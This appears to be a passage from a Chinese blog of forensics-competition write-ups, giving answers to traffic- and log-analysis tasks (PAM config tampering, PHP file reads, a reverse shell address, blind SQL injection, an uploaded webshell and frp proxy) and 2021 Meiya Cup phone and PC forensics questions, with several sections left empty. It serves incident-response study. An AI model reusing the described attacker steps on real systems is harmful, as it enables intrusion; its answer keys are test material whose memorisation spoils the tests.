<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028195159809.png" alt="image-20241028195159809"></p>
<ul>
<li>对该命令执行的base64编码的内容进行解码后会得到</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028195402860.png" alt="image-20241028195402860"></p>
<h3 id="题目6-jwt6"><a class="markdownIt-Anchor" href="#题目6-jwt6"></a> 题目6 jwt6</h3>
<ul>
<li>
<p>黑客在服务器上修改了一个配置文件，文件的绝对路径为___。（请确认绝对路径后再提交）</p>
</li>
<li>
<p>答案：<code>/etc/pam.d/common-auth</code></p>
</li>
<li>
<p>继续分析http协议</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028195919535.png" alt="image-20241028195919535"></p>
<ul>
<li>会发现黑客将这些东西写入进去了，写入到文件目录<code>/etc/pam.d/common-auth</code>，稍微了解一下linux的文件目录就会知道<code>etc</code>这个文件目录一般都存放着配置文件，所以最后的答案就是<code>/etc/pam.d/common-auth</code></li>
</ul>
<h2 id="日志分析"><a class="markdownIt-Anchor" href="#日志分析"></a> 日志分析</h2>
<h3 id="题目7-日志分析1"><a class="markdownIt-Anchor" href="#题目7-日志分析1"></a> 题目7 日志分析1</h3>
<ul>
<li>题目描述单位某应用程序被攻击，请分析日志，进行作答：网络存在源码泄漏，源码文件名是__注意：此附件适用于日志分析所有题目</li>
<li>答案：<code>www.zip</code></li>
<li>这题原本思路是正确的，结果被<code>%2e</code>和<code>%2f</code>给搞半死</li>
<li>这题日志中黑客应该是在暴力查看网页文件，所以会出现一堆404，并且请求头还有各种不同的文件</li>
<li>所以这题只要搜索<code>200</code>这个关键字，表示请求成功，然后一个一个尝试即可</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028205339015.png" alt="image-20241028205339015"></p>
<h3 id="题目8-日志分析2"><a class="markdownIt-Anchor" href="#题目8-日志分析2"></a> 题目8 日志分析2</h3>
<ul>
<li>
<p>分析攻击流量，黑客往/tmp目录写入一个文件，文件名为___。</p>
</li>
<li>
<p>答案：<code>sess_car</code></p>
</li>
<li>
<p>直接关键字搜<code>tmp</code></p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028205516747.png" alt="image-20241028205516747"></p>
<h3 id="题目9-日志分析3"><a class="markdownIt-Anchor" href="#题目9-日志分析3"></a> 题目9 日志分析3</h3>
<ul>
<li>
<p>分析攻击流量，黑客使用的是__类读取了秘密文件。</p>
</li>
<li>
<p>答案：<code>SplFileObject</code></p>
</li>
<li>
<p>第8题写入文件的下方就是读取文件了，将该行请求复制下来，使用url解码就可以看到答案</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028210357709.png" alt="image-20241028210357709"></p>
<ul>
<li>答案为<code>SplFileObject</code>，该类是 PHP 中的一个类，专用于对文件进行操作（如读取、写入等）。该类允许开发者以对象的方式处理文件。</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028210457849.png" alt="image-20241028210457849"></p>
<h2 id="简单日志分析"><a class="markdownIt-Anchor" href="#简单日志分析"></a> 简单日志分析</h2>
<h3 id="题目10-简单日志分析1"><a class="markdownIt-Anchor" href="#题目10-简单日志分析1"></a> 题目10 简单日志分析1</h3>
<ul>
<li>题目描述某应用程序被攻击，请分析日志后作答：黑客攻击的参数是___。（如有字母请全部使用小写）注意：此附件适用于简单日志分析所有题目，后缀名为.zip</li>
<li>答案：<code>user</code></li>
<li>查看日志，一眼望去都是404，就这个地方为500，而且又是这么一长串</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028211117311.png" alt="image-20241028211117311"></p>
<h3 id="题目11-简单日志分析2"><a class="markdownIt-Anchor" href="#题目11-简单日志分析2"></a> 题目11 简单日志分析2</h3>
<ul>
<li>
<p>黑客查看的秘密文件的绝对路径是___。（不带 / ）</p>
</li>
<li>
<p>答案：<code>Th4s_IS_VERY_Import_Fi1e</code></p>
</li>
<li>
<p>还是在题目10的那一行日志中，在该日志中将参数后面的base64编码解码后就会发现读取文件了</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028211352735.png" alt="image-20241028211352735"></p>
<h3 id="题目12-简单日志分析3"><a class="markdownIt-Anchor" href="#题目12-简单日志分析3"></a> 题目12 简单日志分析3</h3>
<ul>
<li>
<p>黑客反弹shell的ip和端口是___。（格式使用“ip:端口&quot;，例如127.0.0.1:2333）</p>
</li>
<li>
<p>答案：<code>192.168.2.197:8888</code></p>
</li>
<li>
<p>聚焦到日志的最后一行就会，将base64解码后就会发现反弹shell的痕迹</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028211652330.png" alt="image-20241028211652330"></p>
<ul>
<li>解码后如下：</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028211717601.png" alt="image-20241028211717601"></p>
<h2 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> SQL注入</h2>
<ul>
<li>交给web手队友，这题我放了</li>
<li>还是做一下吧</li>
<li>SQL注入方式有这几种：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">单引号注入</span><br><span class="line">联合查询注入</span><br><span class="line">布尔盲注</span><br><span class="line">时间盲注</span><br><span class="line">错误注入</span><br><span class="line">二次注入</span><br><span class="line">盲注</span><br></pre></td></tr></table></figure>
<h3 id="题目13-sql注入1"><a class="markdownIt-Anchor" href="#题目13-sql注入1"></a> 题目13 SQL注入1</h3>
<ul>
<li>题目描述某应用程序被攻击，请分析日志后作答：黑客在注入过程中采用的注入手法叫___。（格式为4个汉字，例如“拼搏努力”）注意：此附件适用于SQL注入所有题目</li>
<li>答案：<code>布尔盲注</code></li>
<li>这题有个if语句大概率是布尔盲注</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241104225658155.png" alt="image-20241104225658155"></p>
<h3 id="题目14-sql注入2"><a class="markdownIt-Anchor" href="#题目14-sql注入2"></a> 题目14 SQL注入2</h3>
<ul>
<li></li>
</ul>
<h3 id="题目15-sql注入3"><a class="markdownIt-Anchor" href="#题目15-sql注入3"></a> 题目15 SQL注入3</h3>
<h2 id="wifi"><a class="markdownIt-Anchor" href="#wifi"></a> WIFI</h2>
<h3 id="题目16-wifi1"><a class="markdownIt-Anchor" href="#题目16-wifi1"></a> 题目16 WIFI1</h3>
<h2 id="内存分析"><a class="markdownIt-Anchor" href="#内存分析"></a> 内存分析</h2>
<h3 id="题目18-内存分析1"><a class="markdownIt-Anchor" href="#题目18-内存分析1"></a> 题目18 内存分析1</h3>
<h3 id="题目19内存分析2"><a class="markdownIt-Anchor" href="#题目19内存分析2"></a> 题目19内存分析2</h3>
<h2 id="ios"><a class="markdownIt-Anchor" href="#ios"></a> IOS</h2>
<h3 id="题目20-ios1"><a class="markdownIt-Anchor" href="#题目20-ios1"></a> 题目20 IOS1</h3>
<ul>
<li>一位ios的安全研究员在家中使用手机联网被黑，不仅被窃密还丢失比特币若干，请你通过流量和日志分析后作答：黑客所控制的C&amp;C服务器IP是___。</li>
<li>答案：</li>
</ul>
<h3 id="题目21-ios2"><a class="markdownIt-Anchor" href="#题目21-ios2"></a> 题目21 IOS2</h3>
<h3 id="题目22-ios3"><a class="markdownIt-Anchor" href="#题目22-ios3"></a> 题目22 IOS3</h3>
<h3 id="题目23-ios4"><a class="markdownIt-Anchor" href="#题目23-ios4"></a> 题目23 IOS4</h3>
<h3 id="题目24-ios5"><a class="markdownIt-Anchor" href="#题目24-ios5"></a> 题目24 IOS5</h3>
<h3 id="题目25-ios6"><a class="markdownIt-Anchor" href="#题目25-ios6"></a> 题目25 IOS6</h3>
<h3 id="题目26-ios7"><a class="markdownIt-Anchor" href="#题目26-ios7"></a> 题目26 IOS7</h3>
<h2 id="webshell"><a class="markdownIt-Anchor" href="#webshell"></a> webshell</h2>
<ul>
<li>这题还是流量分析，这题的流量分析主要还是看请求包，偶尔需要看响应包</li>
</ul>
<h3 id="题目27-webshell1"><a class="markdownIt-Anchor" href="#题目27-webshell1"></a> 题目27 webshell1</h3>
<ul>
<li>
<p>黑客登陆系统使用的密码是__</p>
</li>
<li>
<p>答案：<code> Admin123!@#</code></p>
</li>
<li>
<p>分析流量附件看到请求头有<code>login</code>字样，发现登录密码</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028224152611.png" alt="image-20241028224152611"></p>
<h3 id="题目28-webshell2"><a class="markdownIt-Anchor" href="#题目28-webshell2"></a> 题目28 webshell2</h3>
<ul>
<li>
<p>黑客修改了一个日志文件，文件的绝对路径为__答题格式：\xx\xxx\xxx\xxx.log不区分大小写</p>
</li>
<li>
<p>答案：<code>/var/www/html/data/Runtime/Logs/Home/21_08_07.log</code></p>
</li>
<li>
<p>查看流量，查看到该位置，发现日志，但是该日志还不是绝对路径</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028234311667.png" alt="image-20241028234311667"></p>
<ul>
<li>再往下分析就会看到绝对路径了，如果是web方向估计猜都能猜到，但是我是pwn方向</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028234618892.png" alt="image-20241028234618892"></p>
<h3 id="题目29-webshell3"><a class="markdownIt-Anchor" href="#题目29-webshell3"></a> 题目29 webshell3</h3>
<ul>
<li>黑客获取webshell之后的权限是：</li>
<li>答案：<code>www-data</code></li>
<li>继续接下去分析http协议，分析到该处进行了命令执行</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028233552929.png" alt="image-20241028233552929"></p>
<ul>
<li>然后就查看之后一个响应包，这样就可以看到命令执行后返回的内容</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028233726416.png" alt="image-20241028233726416"></p>
<h3 id="题目30-webshell4"><a class="markdownIt-Anchor" href="#题目30-webshell4"></a> 题目30 webshell4</h3>
<ul>
<li>黑客写入的webshell文件名是__。(请提交带有文件后缀的文件名，例如x.txt)</li>
<li>答案：<code>1.php</code></li>
<li>分析到这边，答案直接看到</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028225635130.png" alt="image-20241028225635130"></p>
<h3 id="题目31-webshell5"><a class="markdownIt-Anchor" href="#题目31-webshell5"></a> 题目31 webshell5</h3>
<ul>
<li>
<p>黑客上传的代理工具客户端名字是__。(如有字母请全部使用小写） 仅文件名，不要后缀名</p>
</li>
<li>
<p>答案：<code>frpc</code></p>
</li>
<li>
<p>分析到这里</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028235606210.png" alt="image-20241028235606210"></p>
<ul>
<li>将右边部分去掉<code>7V</code>后解码，得到文件路径和文件名</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028235701413.png" alt="image-20241028235701413"></p>
<h3 id="题目32-webshell6"><a class="markdownIt-Anchor" href="#题目32-webshell6"></a> 题目32 webshell6</h3>
<ul>
<li>
<p>黑客代理工具的回连服务端ip是_。</p>
</li>
<li>
<p>答案：<code>192.168.239.123</code></p>
</li>
<li>
<p>直接将下面一串十六进制转化为字符串即可得到答案</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241029002155837.png" alt="image-20241029002155837"></p>
<ul>
<li>转字符串</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241029002218590.png" alt="image-20241029002218590"></p>
<h3 id="题目33-webshell7"><a class="markdownIt-Anchor" href="#题目33-webshell7"></a> 题目33 webshell7</h3>
<ul>
<li>黑客的socks5的连接账号、密码是__。（中间使用#号隔开，例如admin#passwd）</li>
<li>答案：``</li>
<li>前面的题目32已经找到socket5了密码也在下面</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241029002344553.png" alt="image-20241029002344553"></p>
<h1 id="2021美亚杯个人赛"><a class="markdownIt-Anchor" href="#2021美亚杯个人赛"></a> 2021美亚杯个人赛</h1>
<h2 id="题目1工地主管电话的微信账号是什么"><a class="markdownIt-Anchor" href="#题目1工地主管电话的微信账号是什么"></a> 题目1工地主管电话的微信账号是什么?</h2>
<p>仅一次答题机会</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以上皆非</span><br></pre></td></tr></table></figure>
<ul>
<li>找到聊天记录，可以看到聊天的用户名，但是这个是<code>whatsapp</code>而不是微信，我看了别人的wp，也去搜索了一下香港的<code>whatsapp</code></li>
<li>香港更经常使用的是<code>whatsapp</code>而不是<code>微信</code>,工地主管没有微信</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105092951153.png" alt="image-20241105092951153"></p>
<ul>
<li>搜索结果如下</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105093154646.png" alt="image-20241105093154646"></p>
<h2 id="题目2工地主管的隔空投送装置置编号是什么请以英文全大写及阿拉伯数字回答"><a class="markdownIt-Anchor" href="#题目2工地主管的隔空投送装置置编号是什么请以英文全大写及阿拉伯数字回答"></a> 题目2工地主管的隔空投送装置置编号是什么?(请以英文全大写及阿拉伯数字回答)</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">780F624DF099</span><br></pre></td></tr></table></figure>
<ul>
<li>没用过iPhone，不知道iPhone的隔空投送装置，然后就找不到，结果看wp发现在这里，还是题目做少了</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105121008263.png" alt="image-20241105121008263"></p>
<h2 id="题目3单选题-工地主管电话的哪一个应用程序有关于经纬度24490474-118110220的纪录仅一次答题机会"><a class="markdownIt-Anchor" href="#题目3单选题-工地主管电话的哪一个应用程序有关于经纬度24490474-118110220的纪录仅一次答题机会"></a> 题目3**(单选题)** 工地主管电话的哪一个应用程序有关于经纬度24.490474, 118.110220的纪录?仅一次答题机会</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apple Maps</span><br></pre></td></tr></table></figure>
<ul>
<li>这里直接翻到定位，即可得到</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105094039386.png" alt="image-20241105094039386"></p>
<h2 id="题目4多选题-工地主管的手提电话中下列哪些数据正确仅两次答题机会"><a class="markdownIt-Anchor" href="#题目4多选题-工地主管的手提电话中下列哪些数据正确仅两次答题机会"></a> 题目4**(多选题)** 工地主管的手提电话中下列哪些数据正确?仅两次答题机会</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AC</span><br></pre></td></tr></table></figure>
<ul>
<li>A选项是对的</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105094200415.png" alt="image-20241105094200415"></p>
<ul>
<li>B选项是错误的</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105094235664.png" alt="image-20241105094235664"></p>
<ul>
<li>C选项是对的</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105094314063.png" alt="image-20241105094314063"></p>
<ul>
<li>D选项还没找到，但是根据答案D没安装</li>
</ul>
<h2 id="题目5填空题-工地主管的电话最常使用的浏览器是什么-请以英文全大写回答"><a class="markdownIt-Anchor" href="#题目5填空题-工地主管的电话最常使用的浏览器是什么-请以英文全大写回答"></a> 题目5**(填空题)** 工地主管的电话最常使用的浏览器是什么? (请以英文全大写回答)</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SAFARI</span><br></pre></td></tr></table></figure>
<ul>
<li>查看<code>web history</code>，有看到来源是<code>SAFARI</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105094641969.png" alt="image-20241105094641969"></p>
<h2 id="题目6单选题-工地主管的电话连接过哪一个wifi仅一次答题机会"><a class="markdownIt-Anchor" href="#题目6单选题-工地主管的电话连接过哪一个wifi仅一次答题机会"></a> 题目6**(单选题)** 工地主管的电话连接过哪一个WiFi?仅一次答题机会</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kaiser Lee</span><br></pre></td></tr></table></figure>
<ul>
<li>这题就是点击这里查看</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105121627974.png" alt="image-20241105121627974"></p>
<ul>
<li>然后就会看到</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105121706115.png" alt="image-20241105121706115"></p>
<h2 id="题目7多选题-工地主管与alex-chan的whatsapp-对话中曾提及以下哪个teamviewer的用户号码"><a class="markdownIt-Anchor" href="#题目7多选题-工地主管与alex-chan的whatsapp-对话中曾提及以下哪个teamviewer的用户号码"></a> 题目7**(多选题)** 工地主管与Alex Chan的Whatsapp 对话中，曾提及以下哪个TeamViewer的用户号码?</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A,B,E</span><br></pre></td></tr></table></figure>
<ul>
<li>找到这俩个人的对话和消息记录</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105121852464.png" alt="image-20241105121852464"></p>
<ul>
<li>找到这个对话</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105122034600.png" alt="image-20241105122034600"></p>
<ul>
<li>然后找到这里</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105122128963.png" alt="image-20241105122128963"></p>
<ul>
<li>然后用户号码是以图片的形式发给<code>Alex Chan</code>的，A有，B有，E有</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105122245716.png" alt="image-20241105122245716"></p>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105122305775.png" alt="image-20241105122305775"></p>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105122334457.png" alt="image-20241105122334457"></p>
<h2 id="题目8工地主管的whatsapp中有多少个黑名单的记录-请以阿拉伯数字回答"><a class="markdownIt-Anchor" href="#题目8工地主管的whatsapp中有多少个黑名单的记录-请以阿拉伯数字回答"></a> 题目8工地主管的WhatsApp中有多少个黑名单的记录? (请以阿拉伯数字回答)</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0</span><br></pre></td></tr></table></figure>
<ul>
<li>找半天没找到黑名单，看wp后才知道没有黑名单</li>
</ul>
<h2 id="题目9多选题以下哪个蓝牙装置的-uuid-曾连接过工地主管的手机"><a class="markdownIt-Anchor" href="#题目9多选题以下哪个蓝牙装置的-uuid-曾连接过工地主管的手机"></a> 题目9**(多选题)**以下哪个蓝牙装置的 Uuid 曾连接过工地主管的手机?</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A. 7F1FE70D-2B15-C245-853D-4196F13CC446</span><br><span class="line">B. 1B057C1D-83D3-99A6-D2B1-EC54846C7CEE</span><br></pre></td></tr></table></figure>
<ul>
<li>一开始没找出来，之后反应过来了</li>
<li>ios取证这边直接搜索<code>Bluetooth</code>，发现在数据库里面有存文件</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105183958924.png" alt="image-20241105183958924"></p>
<ul>
<li>找到数据库并且保存下来使用数据库管理工具打开</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105184048133.png" alt="image-20241105184048133"></p>
<ul>
<li>发现uuid</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105184058439.png" alt="image-20241105184058439"></p>
<h2 id="题目10工地主管计算机的e盘的bitlocker修复密钥标识符是甚么-请以英文全大写及阿拉伯数字回答不用输入-"><a class="markdownIt-Anchor" href="#题目10工地主管计算机的e盘的bitlocker修复密钥标识符是甚么-请以英文全大写及阿拉伯数字回答不用输入-"></a> 题目10工地主管计算机的E盘的Bitlocker修复密钥标识符是甚么? (请以英文全大写及阿拉伯数字回答，不用输入”-“)</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">36EBC18095F741FFBE5B4E56E7AF48B1</span><br></pre></td></tr></table></figure>
<ul>
<li>找到最近访问的就可以看到了</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105170438902.png" alt="image-20241105170438902"></p>
